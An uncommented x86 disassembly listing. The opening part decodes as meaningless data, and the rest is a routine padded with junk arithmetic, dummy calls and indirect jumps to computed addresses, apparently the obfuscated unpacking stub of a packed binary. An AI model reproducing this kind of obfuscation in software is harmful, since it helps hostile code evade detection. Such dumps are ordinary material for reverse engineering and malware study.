  451c61:	enter  0xd7be,0xf9
  451c65:	stos   BYTE PTR es:[edi],al
  451c66:	nop
  451c67:	inc    esp
  451c68:	and    edx,ebp
  451c6a:	daa    
  451c6b:	(bad)  
  451c6c:	jae    0x451c16
  451c6e:	sbb    DWORD PTR [eax-0x10ff1e7b],edi
  451c74:	repz sbb eax,0xe921ab74
  451c7a:	push   edx
  451c7b:	daa    
  451c7c:	lds    esp,FWORD PTR [eax+0x2b]
  451c7f:	mov    dh,0xb8
  451c81:	mov    eax,ds:0xfc5d2b9b
  451c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451c87:	and    eax,0xc1086ba1
  451c8c:	lds    ebx,FWORD PTR [esi]
  451c8e:	dec    ebx
  451c8f:	push   0x14762297
  451c94:	jmp    0x5c5c:0xa9d4b4b1
  451c9b:	aas    
  451c9c:	adc    eax,0x28f82c82
  451ca1:	mov    ah,0xaf
  451ca3:	pop    ebx
  451ca4:	jns    0x451c6e
  451ca6:	in     al,dx
  451ca7:	out    dx,eax
  451ca8:	adc    eax,0x9b3e918a
  451cad:	lahf   
  451cae:	jge    0x451c9b
  451cb0:	scas   al,BYTE PTR es:[edi]
  451cb1:	pushf  
  451cb2:	push   edi
  451cb3:	repz xor eax,0x77e892e4
  451cb9:	mov    esi,0xa9fd43c1
  451cbe:	scas   eax,DWORD PTR es:[edi]
  451cbf:	xor    eax,0x6edfa908
  451cc4:	loop   0x451c4f
  451cc6:	test   eax,0xd42072a7
  451ccc:	jne    0x451d16
  451cce:	out    0xe5,al
  451cd0:	inc    ebx
  451cd1:	pop    esi
  451cd2:	push   ebx
  451cd3:	push   esp
  451cd4:	add    BYTE PTR [esi+0x4192b4ba],dh
  451cda:	pop    esp
  451cdb:	cmp    ebp,eax
  451cdd:	retf   0xe7e1
  451ce0:	outs   dx,BYTE PTR ds:[esi]
  451ce1:	stos   BYTE PTR es:[edi],al
  451ce2:	outs   dx,BYTE PTR ds:[esi]
  451ce3:	mov    cl,0x21
  451ce5:	imul   edi,DWORD PTR ds:0x2476a10c,0x9ba6f2c2
  451cef:	or     al,0xc7
  451cf1:	mov    edx,0x1bd72ef4
  451cf6:	cld    
  451cf7:	push   edi
  451cf8:	cmp    al,0x30
  451cfa:	mov    dl,0x54
  451cfc:	sub    DWORD PTR ds:0xda456249,edx
  451d02:	xchg   ebx,eax
  451d03:	jmp    0x4922:0x675f3668
  451d0a:	inc    edi
  451d0b:	push   ebp
  451d0c:	mov    ?,WORD PTR [ebx-0x77]
  451d0f:	out    dx,eax
  451d10:	xor    DWORD PTR [ecx+0x799682fb],ebx
  451d16:	inc    esp
  451d17:	and    al,0xf3
  451d19:	outs   dx,BYTE PTR es:[esi]
  451d1b:	sbb    BYTE PTR ds:0x6b103319,0x4e
  451d22:	dec    eax
  451d23:	jle    0x451ca7
  451d25:	pushf  
  451d26:	fnstenv [ebx]
  451d28:	push   ebp
  451d29:	lahf   
  451d2a:	dec    ecx
  451d2b:	jmp    0x93a00536
  451d30:	and    bl,cl
  451d32:	cmp    al,0x12
  451d34:	cmp    ch,bl
  451d36:	add    BYTE PTR [eax],dl
  451d38:	dec    esi
  451d39:	pushf  
  451d3a:	jnp    0x451d15
  451d3c:	mov    ebx,0xadd8f418
  451d41:	jo     0x451cc9
  451d43:	pop    es
  451d44:	mov    BYTE PTR [esi-0x39d23979],dl
  451d4a:	pop    eax
  451d4b:	call   0xaf96177c
  451d50:	inc    esi
  451d51:	cmp    al,0x1c
  451d53:	pop    eax
  451d54:	test   DWORD PTR [ecx+edi*2+0x72064921],esp
  451d5b:	pushf  
  451d5c:	dec    edi
  451d5d:	mov    eax,ds:0xbe47f4bd
  451d62:	aaa    
  451d63:	jo     0x451cfa
  451d65:	jge    0x451d76
  451d67:	out    0x88,eax
  451d69:	addr16 lock and al,0xa4
  451d6d:	inc    edi
  451d6e:	mov    eax,DWORD PTR [esi+0x3b]
  451d71:	leave  
  451d72:	sub    ch,dl
  451d74:	and    eax,0xfa6be685
  451d79:	push   ss
  451d7a:	fdivr  st(3),st
  451d7c:	mov    bh,al
  451d7e:	sub    eax,0x585c7a31
  451d83:	in     al,dx
  451d84:	xor    bh,BYTE PTR [ecx+0x3fd905d4]
  451d8a:	imul   ebx,DWORD PTR es:[esi],0x455d611b
  451d91:	sub    ch,BYTE PTR [esi-0xc]
  451d94:	in     al,0x74
  451d96:	inc    ebp
  451d97:	and    BYTE PTR [eax+edi*1-0x1377f50a],bh
  451d9e:	ret    0xf84
  451da1:	mov    al,0x9b
  451da3:	leave  
  451da4:	lods   al,BYTE PTR ds:[esi]
  451da5:	fwait
  451da6:	mov    ebx,0x7f2aa9f6
  451dab:	push   ss
  451dac:	fsubr  QWORD PTR [ebx+0x7ac1f2d4]
  451db2:	mov    al,0xc4
  451db4:	push   ds
  451db5:	bound  ecx,QWORD PTR [edx+eax*8]
  451db8:	push   esi
  451db9:	inc    esp
  451dba:	adc    eax,0xb9688d19
  451dc0:	jo     0x451de6
  451dc2:	cmp    al,0x3d
  451dc4:	mov    edx,0xe634cfa1
  451dc9:	mov    bh,BYTE PTR [ebp-0x445e4d01]
  451dcf:	inc    edi
  451dd0:	pop    eax
  451dd1:	xchg   esi,eax
  451dd2:	inc    eax
  451dd3:	add    ebx,DWORD PTR [eax+0x7e1c99be]
  451dd9:	popf   
  451dda:	xchg   ebx,eax
  451ddb:	sbb    BYTE PTR [edx+0x44b5e2c6],bl
  451de1:	sahf   
  451de2:	stos   DWORD PTR es:[edi],eax
  451de3:	inc    esp
  451de4:	stos   DWORD PTR es:[edi],eax
  451de5:	and    ebx,DWORD PTR [eax+0x43]
  451de8:	jg     0x451e5d
  451dea:	stc    
  451deb:	and    bh,BYTE PTR [edx-0x76]
  451dee:	xchg   esp,eax
  451def:	(bad)  
  451df0:	cmp    al,0x88
  451df2:	xchg   ebp,eax
  451df3:	ins    DWORD PTR es:[edi],dx
  451df4:	shl    ebp,1
  451df6:	mov    esi,0x9d908860
  451dfb:	mov    ds:0x21479b2e,eax
  451e00:	mov    bl,0x87
  451e02:	fsubr  QWORD PTR [ebx-0x5]
  451e05:	pop    edx
  451e06:	mov    al,0x2c
  451e08:	xchg   esi,eax
  451e09:	pop    esp
  451e0a:	xor    ebx,DWORD PTR [ebx-0x1b4db160]
  451e10:	dec    ebx
  451e11:	cmp    al,0x1e
  451e13:	push   edx
  451e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451e15:	adc    ebp,ecx
  451e17:	jmp    0x451e8a
  451e19:	cs ins BYTE PTR es:[edi],dx
  451e1b:	jmp    0x5a55:0x524f7921
  451e22:	(bad)  
  451e23:	xor    bh,bh
  451e25:	test   BYTE PTR [ebp+0x3c821e28],cl
  451e2b:	xor    al,0x1b
  451e2d:	daa    
  451e2e:	xor    al,0xc
  451e30:	aaa    
  451e31:	xor    DWORD PTR [edi-0x6710740d],eax
  451e37:	data16 sbb ch,BYTE PTR [ecx-0x65]
  451e3b:	jmp    0x566:0x3c21a5d7
  451e42:	rol    ch,cl
  451e44:	sbb    dl,BYTE PTR [ebx]
  451e46:	mov    ecx,ecx
  451e48:	rcl    DWORD PTR [edx-0x6f4d209c],1
  451e4e:	mov    dl,0x4
  451e50:	lods   eax,DWORD PTR ds:[esi]
  451e51:	fidiv  DWORD PTR [edx-0x791e7a67]
  451e57:	icebp  
  451e58:	lahf   
  451e59:	popa   
  451e5a:	ja     0x451de5
  451e5c:	out    dx,eax
  451e5d:	add    BYTE PTR [ebp+0x52],ch
  451e60:	pusha  
  451e61:	jle    0x451e18
  451e63:	mov    ah,0x30
  451e65:	popf   
  451e66:	scas   al,BYTE PTR es:[edi]
  451e67:	sbb    ebp,esi
  451e69:	add    BYTE PTR [eax],al
  451e6b:	add    BYTE PTR [ebp-0x75],dl
  451e6e:	in     al,dx
  451e6f:	sub    esp,0x78
  451e72:	push   0xfffffff8
  451e74:	push   0xc78b300
  451e79:	push   0xffffffb9
  451e7b:	push   0x8c41ec00
  451e80:	push   0x30
  451e82:	call   0x45347c
  451e87:	add    esp,0x14
  451e8a:	push   ebx
  451e8b:	mov    edx,0x1b
  451e90:	push   edx
  451e91:	push   0xffffffe1
  451e93:	push   0xffffff95
  451e95:	push   0xfe6e3300
  451e9a:	push   0x54c27e00
  451e9f:	call   0x4536fd
  451ea4:	add    esp,0x14
  451ea7:	push   esi
  451ea8:	push   0x3e
  451eaa:	push   0xb0f0f400
  451eaf:	push   0x2c020600
  451eb4:	push   0x2cbdf200
  451eb9:	push   0x747fa100
  451ebe:	call   0x45347c
  451ec3:	add    esp,0x14
  451ec6:	push   edi
  451ec7:	test   eax,0x283560d0
  451ecc:	je     0x451ed1
  451ece:	mov    DWORD PTR [ebp-0x78],eax
  451ed1:	push   0x68
  451ed3:	call   0x4539fb
  451ed8:	add    esp,0x4
  451edb:	xor    eax,eax
  451edd:	mov    edi,eax
  451edf:	push   eax
  451ee0:	push   0x2d
  451ee2:	call   0x4539fb
  451ee7:	add    esp,0x8
  451eea:	mov    DWORD PTR [ebp-0x74],edi
  451eed:	and    eax,edi
  451eef:	push   0x12
  451ef1:	call   0x4539fb
  451ef6:	add    esp,0x4
  451ef9:	push   eax
  451efa:	push   edi
  451efb:	push   0xce115d00
  451f00:	push   eax
  451f01:	call   0x4539fb
  451f06:	add    esp,0x10
  451f09:	call   0x4539fb
  451f0e:	call   0x45347c
  451f13:	push   0x8c243a00
  451f18:	push   edi
  451f19:	push   0xf0df6700
  451f1e:	call   0x4539fb
  451f23:	add    esp,0xc
  451f26:	sub    DWORD PTR [ebp-0x74],edi
  451f29:	push   edi
  451f2a:	push   0x3447e700
  451f2f:	push   0x4e6c5400
  451f34:	push   eax
  451f35:	push   edi
  451f36:	call   0x453f82
  451f3b:	add    esp,0x14
  451f3e:	mov    ecx,edi
  451f40:	push   0xfe0b2500
  451f45:	call   0x45347c
  451f4a:	add    esp,0x4
  451f4d:	xor    edx,edx
  451f4f:	add    DWORD PTR [ebp-0x74],edx
  451f52:	xor    edx,edx
  451f54:	or     eax,edx
  451f56:	call   0x453f82
  451f5b:	or     eax,edi
  451f5d:	mov    esi,DWORD PTR ds:0x4718b0
  451f63:	push   0x1c
  451f65:	push   0xf4343d00
  451f6a:	push   0xffffffe4
  451f6c:	push   0xffffffe4
  451f6e:	push   0xffffffb1
  451f70:	call   0x45347c
  451f75:	add    esp,0x14
  451f78:	push   0x2b
  451f7a:	push   0xde643e00
  451f7f:	call   0x453f82
  451f84:	add    esp,0x8
  451f87:	push   edi
  451f88:	call   0x453f82
  451f8d:	add    esp,0x4
  451f90:	call   0x45347c
  451f95:	push   0x4d
  451f97:	push   0xffffff91
  451f99:	push   edi
  451f9a:	call   0x4536fd
  451f9f:	add    esp,0xc
  451fa2:	add    esi,eax
  451fa4:	cmp    esi,0x41
  451fa7:	je     0x452027
  451fa9:	push   0x8c255800
  451fae:	push   0x44bbee00
  451fb3:	call   0x45347c
  451fb8:	add    esp,0x8
  451fbb:	push   0xfffffffa
  451fbd:	push   edi
  451fbe:	call   0x4536fd
  451fc3:	add    esp,0x8
  451fc6:	push   0x45
  451fc8:	push   eax
  451fc9:	push   eax
  451fca:	push   eax
  451fcb:	push   0x1f
  451fcd:	call   0x45347c
  451fd2:	add    esp,0x14
  451fd5:	push   0x15
  451fd7:	call   0x4536fd
  451fdc:	add    esp,0x4
  451fdf:	push   0x743b6700
  451fe4:	call   0x4539fb
  451fe9:	add    esp,0x4
  451fec:	push   0x4e316000
  451ff1:	push   edi
  451ff2:	push   0x20bbd200
  451ff7:	call   0x4536fd
  451ffc:	add    esp,0xc
  451fff:	cmp    esi,DWORD PTR [ebp-0x58]
  452002:	je     0x452027
  452004:	add    esi,esi
  452006:	push   0xa8b98500
  45200b:	push   0xffffffbd
  45200d:	push   0xffffffec
  45200f:	push   0x70
  452011:	call   0x453f82
  452016:	add    esp,0x10
  452019:	push   eax
  45201a:	push   0x64
  45201c:	call   0x4536fd
  452021:	add    esp,0x8
  452024:	add    DWORD PTR [ebp-0x74],esi
  452027:	push   eax
  452028:	push   0x2e157100
  45202d:	call   0x4536fd
  452032:	add    esp,0x8
  452035:	sub    DWORD PTR [ebp-0x74],edi
  452038:	mov    edi,DWORD PTR [ebp-0x74]
  45203b:	push   0x2c
  45203d:	push   0xffffffb6
  45203f:	call   0x4539fb
  452044:	add    esp,0x8
  452047:	cmp    edi,0xffffffba
  45204a:	jne    0x452061
  45204c:	push   eax
  45204d:	push   0xa0e43b00
  452052:	push   esi
  452053:	push   edi
  452054:	push   0x70a8e400
  452059:	call   0x45347c
  45205e:	add    esp,0x14
  452061:	or     DWORD PTR [ebp-0x74],edi
  452064:	push   0x2c0dbe00
  452069:	push   0x1e57a100
  45206e:	push   0x6ce98200
  452073:	push   0x50
  452075:	push   eax
  452076:	call   0x4536fd
  45207b:	add    esp,0x14
  45207e:	push   0x74276100
  452083:	push   0x209dd000
  452088:	push   0x5a
  45208a:	push   eax
  45208b:	call   0x4536fd
  452090:	add    esp,0x10
  452093:	and    edi,esi
  452095:	push   eax
  452096:	push   0xffffffda
  452098:	call   0x453f82
  45209d:	add    esp,0x8
  4520a0:	add    edi,esi
  4520a2:	sub    DWORD PTR [ebp-0x74],edi
  4520a5:	push   0x1c
  4520a7:	push   eax
  4520a8:	push   0x8
  4520aa:	push   0x8f15600
  4520af:	call   0x453f82
  4520b4:	add    esp,0x10
  4520b7:	lea    eax,[ebp-0x50]
  4520ba:	push   eax
  4520bb:	call   DWORD PTR ds:0x460040
  4520c1:	push   eax
  4520c2:	push   edi
  4520c3:	push   esi
  4520c4:	push   0x5094ff00
  4520c9:	push   eax
  4520ca:	call   0x4536fd
  4520cf:	add    esp,0x14
  4520d2:	push   0x0
  4520d4:	push   0x0
  4520d6:	push   0xc1
  4520db:	push   0x4718e4
  4520e0:	call   DWORD PTR ds:0x460034
  4520e6:	mov    eax,edi
  4520e8:	push   edi
  4520e9:	call   0x4536fd
  4520ee:	add    esp,0x4
  4520f1:	push   0x471914
  4520f6:	call   DWORD PTR ds:0x460078
  4520fc:	push   edi
  4520fd:	push   eax
  4520fe:	push   esi
  4520ff:	push   0xffffffe4
  452101:	call   0x45347c
  452106:	add    esp,0x10
  452109:	push   0x1
  45210b:	push   0x0
  45210d:	call   DWORD PTR ds:0x460024
  452113:	xor    edx,edx
  452115:	add    edx,eax
  452117:	add    DWORD PTR [ebp-0x74],edx
  45211a:	mov    DWORD PTR [ebp-0x5c],eax
  45211d:	add    esi,edx
  45211f:	push   0xffffffcc
  452121:	push   eax
  452122:	push   0xf475a200
  452127:	push   0xffffff91
  452129:	call   0x4539fb
  45212e:	add    esp,0x10
  452131:	add    DWORD PTR [ebp-0x74],esi
  452134:	call   DWORD PTR ds:0x460028
  45213a:	sub    DWORD PTR [ebp-0x74],eax
  45213d:	mov    DWORD PTR [ebp-0x58],eax
  452140:	push   0xfc9f2f00
  452145:	call   0x453f82
  45214a:	add    esp,0x4
  45214d:	push   0xffffff8b
  45214f:	push   0x9
  452151:	push   0xce7f8700
  452156:	push   0xffffffac
  452158:	call   0x45347c
  45215d:	add    esp,0x10
  452160:	call   0x45347c
  452165:	sub    DWORD PTR [ebp-0x74],esi
  452168:	mov    esi,0x27
  45216d:	add    esi,esi
  45216f:	push   esi
  452170:	push   0x1b
  452172:	push   0x9884f300
  452177:	call   0x4536fd
  45217c:	add    esp,0xc
  45217f:	test   edi,0x95
  452185:	je     0x4521a2
  452187:	cmp    edi,DWORD PTR [ebp-0x74]
  45218a:	je     0x4521a2
  45218c:	cmp    eax,esi
  45218e:	je     0x4521a2
  452190:	push   0x8c55c400
  452195:	push   0xb4068000
  45219a:	call   0x453f82
  45219f:	add    esp,0x8
  4521a2:	push   0x5c
  4521a4:	push   0xe8d28000
  4521a9:	push   esi
  4521aa:	push   0x40c71200
  4521af:	push   0x747d7100
  4521b4:	call   0x4536fd
  4521b9:	add    esp,0x14
  4521bc:	push   0x41
  4521be:	push   edi
  4521bf:	push   edi
  4521c0:	call   0x453f82
  4521c5:	add    esp,0xc
  4521c8:	and    esi,edi
  4521ca:	cmp    esi,DWORD PTR ds:0x4718e4
  4521d0:	jne    0x4521f5
  4521d2:	push   0x2a
  4521d4:	call   0x4539fb
  4521d9:	add    esp,0x4
  4521dc:	push   eax
  4521dd:	push   0xffffffcf
  4521df:	call   0x4539fb
  4521e4:	add    esp,0x8
  4521e7:	push   0xd0c67300
  4521ec:	push   esi
  4521ed:	call   0x4539fb
  4521f2:	add    esp,0x8
  4521f5:	sub    edi,eax
  4521f7:	push   0xf48fb700
  4521fc:	push   edi
  4521fd:	push   0x48f97200
  452202:	call   0x45347c
  452207:	add    esp,0xc
  45220a:	or     esi,edi
  45220c:	sub    DWORD PTR [ebp-0x74],esi
  45220f:	push   0x3c
  452211:	push   0xe
  452213:	call   0x4539fb
  452218:	add    esp,0x8
  45221b:	push   eax
  45221c:	push   esi
  45221d:	call   0x4539fb
  452222:	add    esp,0x8
  452225:	push   eax
  452226:	push   0xffffff94
  452228:	push   0xffffff92
  45222a:	call   0x453f82
  45222f:	add    esp,0xc
  452232:	push   esi
  452233:	push   0xeca36500
  452238:	call   0x4539fb
  45223d:	add    esp,0x8
  452240:	push   edi
  452241:	push   esi
  452242:	push   0xffffffd7
  452244:	call   0x453f82
  452249:	add    esp,0xc
  45224c:	cmp    edi,DWORD PTR ds:0x4718b0
  452252:	jne    0x452260
  452254:	push   0xffffffee
  452256:	push   eax
  452257:	push   edi
  452258:	call   0x45347c
  45225d:	add    esp,0xc
  452260:	mov    esi,DWORD PTR [ebp-0x74]
  452263:	mov    DWORD PTR [ebp-0x74],esi
  452266:	push   0xffffffeb
  452268:	call   0x4539fb
  45226d:	add    esp,0x4
  452270:	push   edi
  452271:	push   0x58
  452273:	push   0x5e
  452275:	call   0x453f82
  45227a:	add    esp,0xc
  45227d:	call   0x4539fb
  452282:	lea    edx,[ebp-0x4]
  452285:	sub    DWORD PTR [ebp-0x74],edx
  452288:	sub    DWORD PTR [ebp-0x74],edx
  45228b:	push   edx
  45228c:	push   0xffffff95
  45228e:	push   edi
  45228f:	call   0x45347c
  452294:	add    esp,0x8
  452297:	push   0x91eea11e
  45229c:	push   0xf4bf9600
  4522a1:	call   0x4536fd
  4522a6:	add    esp,0x4
  4522a9:	push   0x63
  4522ab:	call   0x453f82
  4522b0:	add    esp,0x4
  4522b3:	call   0x452527
  4522b8:	cmp    eax,0xffffff8d
  4522bb:	je     0x4522d1
  4522bd:	push   0x38a09b00
  4522c2:	push   esi
  4522c3:	push   0xb4a5df00
  4522c8:	push   edi
  4522c9:	call   0x4539fb
  4522ce:	add    esp,0x10
  4522d1:	mov    esi,DWORD PTR [ebp-0x4]
  4522d4:	call   0x4539fb
  4522d9:	shr    esi,0x10
  4522dc:	push   eax
  4522dd:	push   0xc42c000
  4522e2:	push   0x740de200
  4522e7:	push   0x44dc0b00
  4522ec:	call   0x45347c
  4522f1:	add    esp,0x10
  4522f4:	cmp    esi,0xa4b8
  4522fa:	jne    0x45248c
  452300:	mov    ecx,DWORD PTR [ebp-0x74]
  452303:	sub    ecx,esi
  452305:	push   0x20ba7000
  45230a:	call   0x453f82
  45230f:	add    esp,0x4
  452312:	mov    edi,0xa4fd9854
  452317:	push   eax
  452318:	push   0x8c370500
  45231d:	call   0x4536fd
  452322:	add    esp,0x8
  452325:	sub    edi,DWORD PTR [ebp-0x4]
  452328:	push   0x7a
  45232a:	call   0x4539fb
  45232f:	add    esp,0x4
  452332:	call   edi
  452334:	cmp    edi,0x1f
  452337:	je     0x452377
  452339:	sub    edi,esi
  45233b:	sub    edi,eax
  45233d:	xor    ecx,ecx
  45233f:	sub    edi,ecx
  452341:	mov    ebx,DWORD PTR [ebp-0x74]
  452344:	sub    ebx,eax
  452346:	cmp    edi,DWORD PTR ds:0x471914
  45234c:	je     0x452377
  45234e:	mov    edx,DWORD PTR [ebp-0x74]
  452351:	sub    DWORD PTR [ebp-0x74],ebx
  452354:	cmp    edx,DWORD PTR [ebp-0x5c]
  452357:	je     0x452377
  452359:	add    DWORD PTR [ebp-0x74],edx
  45235c:	cmp    edi,0xfffffff9
  45235f:	je     0x452377
  452361:	xor    ebx,ebx
  452363:	or     edi,esi
  452365:	add    DWORD PTR [ebp-0x74],ecx
  452368:	mov    edx,DWORD PTR [ebp-0x74]
  45236b:	add    DWORD PTR [ebp-0x74],edx
  45236e:	sub    DWORD PTR [ebp-0x74],edi
  452371:	sub    DWORD PTR [ebp-0x74],edi
  452374:	xor    DWORD PTR [ebp-0x74],ebx
  452377:	mov    DWORD PTR [ebp-0x70],eax
  45237a:	push   edi
  45237b:	push   edx
  45237c:	call   0x4539fb
  452381:	add    esp,0x8
  452384:	mov    edx,0x452c76
  452389:	mov    esi,DWORD PTR [ebp-0x74]
  45238c:	xor    ebx,ebx
  45238e:	add    esi,ebx
  452390:	cmp    esi,ebx
  452392:	jne    0x4523bb
  452394:	mov    ecx,ebx
  452396:	cmp    esi,DWORD PTR ds:0x4718e4
  45239c:	je     0x4523bb
  45239e:	mov    eax,0xe0b81040
  4523a3:	mov    edi,0xba
  4523a8:	add    DWORD PTR [ebp-0x74],ecx
  4523ab:	add    eax,ecx
  4523ad:	sub    esi,eax
  4523af:	sub    esi,ebx
  4523b1:	add    esi,ebx
  4523b3:	add    DWORD PTR [ebp-0x74],esi
  4523b6:	and    esi,edi
  4523b8:	add    DWORD PTR [ebp-0x74],esi
  4523bb:	push   DWORD PTR [ebp-0x4]
  4523be:	push   0xa4b9d6f1
  4523c3:	push   DWORD PTR [ebp-0x70]
  4523c6:	call   edx
  4523c8:	call   0x453f82
  4523cd:	add    DWORD PTR [ebp-0x70],0x2c
  4523d4:	xor    ecx,ecx
  4523d6:	push   0x344b9800
  4523db:	call   0x4536fd
  4523e0:	add    esp,0x4
  4523e3:	mov    eax,DWORD PTR [ebp-0x70]
  4523e6:	sub    edi,esi
  4523e8:	mov    esi,DWORD PTR [ebp-0x74]
  4523eb:	add    edi,eax
  4523ed:	mov    ecx,DWORD PTR [ebp-0x74]
  4523f0:	cmp    ecx,DWORD PTR ds:0x4718b0
  4523f6:	je     0x452449
  4523f8:	mov    edx,DWORD PTR ds:0x4718ac
  4523fe:	xor    ebx,ebx
  452400:	sub    ecx,eax
  452402:	sub    ecx,edx
  452404:	add    DWORD PTR [ebp-0x74],edi
  452407:	cmp    esi,DWORD PTR [ebp-0x5c]
  45240a:	je     0x452449
  45240c:	mov    edi,0x59
  452411:	mov    edx,DWORD PTR ds:0x4718cc
  452417:	sub    DWORD PTR [ebp-0x74],esi
  45241a:	add    ecx,edi
  45241c:	sub    DWORD PTR [ebp-0x74],edx
  45241f:	cmp    ecx,0x65
  452422:	je     0x452449
  452424:	xor    esi,esi
  452426:	mov    edi,DWORD PTR [ebp-0x74]
  452429:	mov    DWORD PTR [ebp-0x74],edi
  45242c:	cmp    ecx,esi
  45242e:	jne    0x452449
  452430:	add    esi,ecx
  452432:	mov    edi,0x56
  452437:	mov    ecx,0x41
  45243c:	add    DWORD PTR [ebp-0x74],esi
  45243f:	sub    ecx,edi
  452441:	sub    DWORD PTR [ebp-0x74],ebx
  452444:	add    ecx,edi
  452446:	add    DWORD PTR [ebp-0x74],ecx
  452449:	call   eax
  45244b:	push   0xffffffde
  45244d:	push   0xc79d000
  452452:	call   0x4536fd
  452457:	add    esp,0x8
  45245a:	mov    ebx,eax
  45245c:	mov    ecx,DWORD PTR [ebp-0x74]
  45245f:	add    DWORD PTR [ebp-0x74],eax
  452462:	sub    ebx,edi
  452464:	push   0x3406ad00
  452469:	push   0x56
  45246b:	call   0x4536fd
  452470:	add    esp,0x8
  452473:	add    DWORD PTR [ebp-0x74],ebx
  452476:	xor    eax,eax
  452478:	push   0xee594600
  45247d:	push   0xc588d00
  452482:	push   0xffffffb3
  452484:	call   0x453f82
  452489:	add    esp,0xc
  45248c:	add    DWORD PTR [ebp-0x74],eax
  45248f:	push   edi
  452490:	push   0xffffff9c
  452492:	push   0xffffffb5
  452494:	call   0x4536fd
  452499:	add    esp,0xc
  45249c:	sub    DWORD PTR [ebp-0x74],ebx
  45249f:	pop    edi
  4524a0:	test   edi,0x6e
  4524a6:	jne    0x452506
  4524a8:	mov    edx,0x4c
  4524ad:	sub    edx,esi
  4524af:	mov    ebx,edx
  4524b1:	add    DWORD PTR [ebp-0x74],edi
  4524b4:	cmp    edx,esi
  4524b6:	jne    0x452506
  4524b8:	push   0x53
  4524ba:	push   edx
  4524bb:	push   0xffffff92
  4524bd:	push   0x8e0b0300
  4524c2:	call   0x453f82
  4524c7:	add    esp,0x10
  4524ca:	push   eax
  4524cb:	push   0x5cd96600
  4524d0:	call   0x4539fb
  4524d5:	add    esp,0x8
  4524d8:	push   0x3e7e2500
  4524dd:	push   0x0
  4524df:	push   0xf418a700
  4524e4:	push   0x8e6c5900
  4524e9:	call   0x4536fd
  4524ee:	add    esp,0x10
  4524f1:	push   esi
  4524f2:	push   0x7d
  4524f4:	push   0x2e222500
  4524f9:	call   0x4539fb
  4524fe:	add    esp,0xc
  452501:	add    ebx,ebx
  452503:	sub    DWORD PTR [ebp-0x74],ebx
  452506:	pop    esi
  452507:	mov    ecx,edi
  452509:	call   0x45347c
  45250e:	pop    ebx
  45250f:	push   0xfffffff5
  452511:	push   0x26
  452513:	push   0x88c38a00
  452518:	call   0x4539fb
  45251d:	add    esp,0xc
  452520:	leave  
  452521:	ret    
  452522:	int3   
  452523:	int3   
  452524:	int3   
  452525:	int3   
  452526:	int3   
  452527:	push   ebp
  452528:	mov    ebp,esp
  45252a:	sub    esp,0x5c
  45252d:	xor    edx,edx
  45252f:	call   0x45347c
  452534:	push   ebx
  452535:	cmp    eax,0xffffffbc
  452538:	jne    0x45253d
  45253a:	mov    DWORD PTR [ebp-0x50],eax
  45253d:	push   esi
  45253e:	push   0xfffffffc
  452540:	call   0x4539fb
  452545:	add    esp,0x4
  452548:	push   edi
  452549:	push   0xa48c9200
  45254e:	push   0x6e7d2f00
  452553:	call   0x45347c
  452558:	add    esp,0x8
  45255b:	push   0xc54cc00
  452560:	push   eax
  452561:	push   eax
  452562:	push   eax
  452563:	push   0x49
  452565:	call   0x45347c
  45256a:	add    esp,0x14
  45256d:	mov    DWORD PTR [ebp-0x4c],0xef572513
  452574:	mov    ebx,0x3
  452579:	mov    eax,0xb1
  45257e:	push   0x3e496900
  452583:	push   0x44
  452585:	push   eax
  452586:	push   0x74
  452588:	call   0x4536fd
  45258d:	add    esp,0x10
  452590:	or     ebx,eax
  452592:	cmp    eax,ebx
  452594:	jne    0x4525b3
  452596:	mov    eax,0xdc
  45259b:	push   ebx
  45259c:	push   0xde42ec00
  4525a1:	push   0xce577600
  4525a6:	push   0x9cf75900
  4525ab:	call   0x4539fb
  4525b0:	add    esp,0x10
  4525b3:	call   0x452a9f
  4525b8:	cmp    eax,0x6d
  4525bb:	je     0x452680
  4525c1:	cmp    ebx,eax
  4525c3:	jne    0x452680
  4525c9:	mov    edi,0x8778
  4525ce:	cmp    eax,ebx
  4525d0:	je     0x452680
  4525d6:	mov    ecx,DWORD PTR ds:0x4718d4
  4525dc:	add    ecx,eax
  4525de:	cmp    ecx,DWORD PTR [ebp-0x44]
  4525e1:	je     0x452680
  4525e7:	and    ecx,edi
  4525e9:	sub    ecx,eax
  4525eb:	mov    edx,0xed
  4525f0:	mov    DWORD PTR [ebp-0x58],ecx
  4525f3:	xor    edi,edi
  4525f5:	add    edi,ecx
  4525f7:	add    edx,ecx
  4525f9:	sub    DWORD PTR [ebp-0x58],edi
  4525fc:	sub    edx,edi
  4525fe:	cmp    edx,edi
  452600:	je     0x452680
  452602:	mov    ebx,0xf9
  452607:	cmp    edx,ecx
  452609:	je     0x452680
  45260b:	mov    ecx,DWORD PTR [ebp-0x58]
  45260e:	or     ecx,eax
  452610:	sub    DWORD PTR [ebp-0x58],edi
  452613:	mov    esi,DWORD PTR [ebp-0x58]
  452616:	cmp    edx,ecx
  452618:	jne    0x452680
  45261a:	sub    ecx,edx
  45261c:	mov    ebx,DWORD PTR [ebp-0x58]
  45261f:	cmp    eax,DWORD PTR ds:0x4718d4
  452625:	je     0x452680
  452627:	sub    ecx,eax
  452629:	mov    edx,DWORD PTR [ebp-0x58]
  45262c:	mov    edi,DWORD PTR [ebp-0x58]
  45262f:	cmp    esi,DWORD PTR [ebp-0x10]
  452632:	jne    0x452680
  452634:	add    ebx,ebx
  452636:	add    edx,eax
  452638:	cmp    edi,DWORD PTR ds:0x4718d4
  45263e:	je     0x452680
  452640:	test   edx,0x1cfc
  452646:	je     0x452680
  452648:	add    ebx,eax
  45264a:	add    ecx,eax
  45264c:	sub    edx,ecx
  45264e:	mov    ecx,esi
  452650:	add    ecx,ebx
  452652:	add    DWORD PTR [ebp-0x58],eax
  452655:	add    DWORD PTR [ebp-0x58],edx
  452658:	sub    DWORD PTR [ebp-0x58],edx
  45265b:	cmp    edi,eax
  45265d:	je     0x452680
  45265f:	and    ecx,ebx
  452661:	xor    edx,edx
  452663:	sub    edx,edi
  452665:	sub    ecx,edx
  452667:	and    DWORD PTR [ebp-0x58],edi
  45266a:	xor    ebx,ebx
  45266c:	sub    ebx,ecx
  45266e:	cmp    ebx,eax
  452670:	je     0x452680
  452672:	sub    ebx,ecx
  452674:	sub    DWORD PTR [ebp-0x58],edx
  452677:	mov    edx,ecx
  452679:	add    ebx,edx
  45267b:	and    ebx,edi
  45267d:	add    DWORD PTR [ebp-0x58],ebx
  452680:	mov    DWORD PTR [ebp-0xc],eax
  452683:	cmp    esi,edi
  452685:	je     0x452694
  452687:	push   0x5488d000
  45268c:	call   0x4536fd
  452691:	add    esp,0x4
